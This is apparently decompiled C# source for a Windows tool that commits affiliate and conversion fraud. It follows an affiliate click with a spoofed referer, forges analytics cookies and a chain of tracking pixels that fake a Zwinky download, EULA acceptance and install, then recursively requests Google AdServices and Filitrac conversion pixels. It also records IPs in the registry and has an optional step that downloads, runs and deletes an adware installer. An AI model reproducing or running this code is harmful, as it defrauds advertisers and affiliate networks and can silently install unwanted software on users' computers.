using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using HTTPAgent;
using Microsoft.Win32;

namespace AffiliateExecuterNoWin;

internal static class Program
{
	private static string trackerUrlAndVersion;

	[STAThread]
	private static void Main(string[] args)
	{
		string referer = "http://createyourfreecartoon.info/zw";
		string appName = "xxddd11";
		bool flag = false;
		string uRL = "http://lookforpages.com/checkip/index.php";
		bool flag2 = false;
		string text = "ZwinkySetup2.3.67.1.SA.HP.ZJfox000.exe";
		string url = "http://ak.exe.imgfarm.com/images/nocache/funwebproducts/2.3.67.1/" + text;
		trackerUrlAndVersion = "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1";
		DateTime dateTime = new DateTime(3000, 1, 1);
		if (dateTime < DateTime.Now)
		{
			return;
		}
		Agent agent = new Agent();
		agent.EmulateBrowser();
		string uRL2;
		if (flag)
		{
			uRL2 = agent.GetURL(uRL);
			string text2 = DataExtractor.ExtractDataArray(uRL2, "(\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b)", "$1")[0];
			string savedIPs = GetSavedIPs(appName);
			if (savedIPs.IndexOf(text2) >= 0)
			{
				return;
			}
			SetSavedIPs(appName, savedIPs + text2 + ";");
		}
		agent.Referer = referer;
		uRL2 = agent.GetURL("http://srtvd.com/click/?s=199129&c=442713");
		string uRL3 = DataExtractor.ExtractDataArray(uRL2, "window.location=\"([^\"]+)", "$1")[0];
		string uRL4 = agent.GetURL(uRL3);
		uRL3 = agent.Referer;
		if (!uRL3.StartsWith("http://www.zwinky.com"))
		{
			return;
		}
		string text3 = DataExtractor.ExtractDataArray(uRL4, "splash/partner/([^\"']+)", "$1")[0];
		addTrackingCookies(agent.cookieJar, "zwinky.com");
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=76827077&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmcn=1&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmr=-&utmp=[URL]", "[URL]", uRL3.Replace("http://www.zwinky.com", ""));
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=819838613&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/cookie_enabled", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=635864703&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/partner/[partnerID]", "[partnerID]", text3);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=2078872738&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/super_div/button_click", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=731157866&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/super_div/easy_install_complete", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1747947031&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/super_div/show_eula", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=460665103&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/settings/checkboxes/sa2_on/hp_on", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1333432023&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/super_div/accept", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=727680549&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/offer/0/criteria_check", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1333218891&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/offer/0/show", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1736055569&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/super_div/install_progress", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1289440058&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/splash/super_div/download_complete", null, null);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=1182318575&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/settings/optin/sa2_on_on/hp_on_on", null, null);
		if (flag2)
		{
			if (Directory.Exists("C:\\Users\\Public\\Documents\\"))
			{
				text = "C:\\Users\\Public\\Documents\\" + text;
			}
			agent.getURL2File(url, text);
			try
			{
				Process process = Process.Start(text);
				process.WaitForExit();
				File.Delete(text);
			}
			catch
			{
			}
		}
		string uRL5 = agent.GetURL("http://www.zwinky.com/dl/successPixels.jhtml");
		GetRecursivePixels(agent, uRL5);
		GetTrackingUrlByTemplate(agent, "http://utm.trk.zwinky.com/__utm.gif?utmwv=6.1&utmn=535398937&utmsr=819x480&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0&utmdt=Zwinky%20Download&utmhn=www.zwinky.com&utmp=/clicks/settings/run_run/[RANDOMID]", "[RANDOMID]", "u%253D" + randomString(22) + "%2526p%253D" + text3);
	}

	private static void GetRecursivePixels(Agent agent, string html)
	{
		html = Regex.Replace(html, "<noscript>.*?</noscript>", "");
		List<string> list = new List<string>();
		list.AddRange(DataExtractor.ExtractDataArray(html, "pt src=\" ?([^\"]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<SCRIPT language=\"javascript\" src=\" ?([^\"]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<img src=\\\\?\" ?([^\"\\\\]+)", "$1"));
		list.AddRange(DataExtractor.ExtractDataArray(html, "<iframe[^>]+?src=[\"']([^\"']+)", "$1"));
		string text = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_id *= *([0-9]+)", "$1"));
		string text2 = "";
		string text3 = "";
		string text4 = "";
		string text5 = "";
		if (text != "")
		{
			text2 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_language\\s*=\\s*\"([^\"]+)", "$1"));
			text3 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_format\\s*=\\s*\"([^\"]+)", "$1"));
			text4 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_color\\s*=\\s*\"([^\"]+)", "$1"));
			text5 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var google_conversion_label\\s*=\\s*\"([^\"]+)", "$1"));
			list.Add(createGoogleAdServicesURL(text, text2, text3, text4, text5));
		}
		string text6 = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var filitrac_offer_id\\s*=\\s*'([^']+)", "$1"));
		string referece = FirstOrEmpty(DataExtractor.ExtractDataArray(html, "var filitrac_reference\\s*=\\s*'([^']+)", "$1"));
		if (text6 != "")
		{
			list.Add(createFilitracURL(text6, referece));
		}
		string referer = agent.Referer;
		foreach (string item in list)
		{
			agent.Referer = referer;
			string uRL = agent.GetURL(item.Trim().Replace("&amp;", "&"));
			GetRecursivePixels(agent, uRL);
		}
	}

	private static string randomString(int len)
	{
		string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
		Random random = new Random();
		string text2 = "";
		for (int i = 0; i < len; i++)
		{
			text2 += text[random.Next(text.Length)];
		}
		return text2;
	}

	private static string GetSavedIPs(string appName)
	{
		string result = ";";
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("SOFTWARE\\" + appName, writable: false);
			if (currentUser != null)
			{
				result = currentUser.GetValue("ips")!.ToString();
				return result;
			}
			return result;
		}
		catch
		{
			return result;
		}
	}

	private static void SetSavedIPs(string appName, string val)
	{
		try
		{
			RegistryKey currentUser = Registry.CurrentUser;
			currentUser = currentUser.OpenSubKey("SOFTWARE\\" + appName, writable: true);
			if (currentUser == null)
			{
				currentUser = Registry.CurrentUser.CreateSubKey("SOFTWARE\\" + appName);
			}
			currentUser.SetValue("ips", val);
		}
		catch
		{
		}
	}

	public static void addTrackingCookies(CookieContainer cookies, string domain)
	{
		Random random = new Random();
		Uri uri = new Uri("http://" + domain + "/");
		long num = (long)(DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds;
		string text = uHash(domain);
		string value = text + "." + random.Next(int.MaxValue) + "." + num + "." + num + "." + num + ".1";
		string value2 = text + "." + num + ".1.1.utmcsr=ZJxdm380|utmccn=(not+set)|utmcmd=(not+set)";
		cookies.Add(uri, createCookie("__utma", value, 1800));
		cookies.Add(uri, createCookie("__utmb", text, 1800));
		cookies.Add(uri, createCookie("__utmc", text, 1800));
		cookies.Add(uri, createCookie("__utmz", value2, 1800));
	}

	public static string uHash(string d)
	{
		int num = 0;
		int num2 = 0;
		for (int num3 = d.Length - 1; num3 >= 0; num3--)
		{
			int num4 = char.Parse(d.Substring(num3, 1));
			num = ((num << 6) & 0xFFFFFFF) + num4 + (num4 << 14);
			if ((num2 = num & 0xFE00000) != 0)
			{
				num ^= num2 >> 21;
			}
		}
		return num.ToString();
	}

	public static Cookie createCookie(string name, string value, int timeout)
	{
		Cookie cookie = new Cookie(name, value);
		cookie.Expires = DateTime.Now.AddSeconds(timeout);
		return cookie;
	}

	public static string GetTrackingUrlByTemplate(Agent agent, string url, string trackingSearch, string trackingReplace)
	{
		string title = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmdt=([^&]*)", "$1"));
		string hostname = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmhn=([^&]*)", "$1"));
		string referer = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmr=([^&]*)", "$1"));
		string tracking = FirstOrEmpty(DataExtractor.ExtractDataArray(url, "&utmp=(.*)", "$1"));
		bool addutmcn = ((!(FirstOrEmpty(DataExtractor.ExtractDataArray(url, "(&utmcn=1)", "$1")) == "")) ? true : false);
		string text = createTrackingUrl(title, hostname, referer, tracking, addutmcn);
		if (!string.IsNullOrEmpty(trackingSearch) || !string.IsNullOrEmpty(trackingReplace))
		{
			text = text.Replace(trackingSearch, trackingReplace);
		}
		return agent.GetURL(text);
	}

	public static string FirstOrEmpty(string[] arr)
	{
		if (arr.Length > 0)
		{
			return arr[0];
		}
		return "";
	}

	public static string GetTrackingUrl(Agent agent, string title, string hostname, string referer, string tracking, bool addutmcn)
	{
		return agent.GetURL(createTrackingUrl(title, hostname, referer, tracking, addutmcn));
	}

	public static string createTrackingUrl(string title, string hostname, string referer, string tracking, bool addutmcn)
	{
		Random random = new Random();
		string text = Screen.get_PrimaryScreen().get_Bounds().Width + "x" + Screen.get_PrimaryScreen().get_Bounds().Height;
		return trackerUrlAndVersion + "&utmn=" + random.Next(int.MaxValue) + "&utmsr=" + text + "&utmsc=32-bit&utmul=en-us&utmje=1&utmjv=1.3&utmfl=10.0" + (addutmcn ? "&utmcn=1" : "") + ((title == "") ? "" : ("&utmdt=" + title)) + "&utmhn=" + hostname + ((referer == "") ? "" : ("&utmr=" + referer)) + "&utmp=" + tracking;
	}

	private static string createFilitracURL(string offerID, string referece)
	{
		return "http://www.filitrac.com/Lead.aspx?pid=" + offerID + "&ref=" + referece + "&iframe=1";
	}

	private static string createGoogleAdServicesURL(string cid, string clang, string cformat, string ccolor, string clabel)
	{
		long num = 1000L * (long)(DateTime.Now.ToUniversalTime() - new DateTime(1970, 1, 1, 0, 0, 0, DateTimeKind.Utc)).TotalSeconds + new Random().Next(1000);
		string[] array = clang.Split(new char[1] { '_' });
		string text = array[0];
		string text2 = ((array.Length <= 1) ? "" : array[1]);
		_ = DateTime.Now - DateTime.UtcNow;
		return "http://www.googleadservices.com/pagead/conversion/" + cid + "/?random=" + num + "&cv=6&fst=" + num + "&num=1&fmt=" + cformat + "&label=" + clabel + "&bg=" + ccolor + "&hl=" + text + "&gl=" + text2 + "&guid=ON&u_h=" + Screen.get_PrimaryScreen().get_Bounds().Height + "&u_w=" + Screen.get_PrimaryScreen().get_Bounds().Width + "&u_ah=" + (Screen.get_PrimaryScreen().get_Bounds().Height - 30) + "&u_aw=" + Screen.get_PrimaryScreen().get_Bounds().Width + "&u_cd=32&u_his=2&u_tz=" + (int)(DateTime.Now - DateTime.UtcNow).TotalMinutes + "&u_nplug=0&u_nmime=0&url=http%3A//www.zwinky.com/dl/successPixels.jhtml";
	}
}
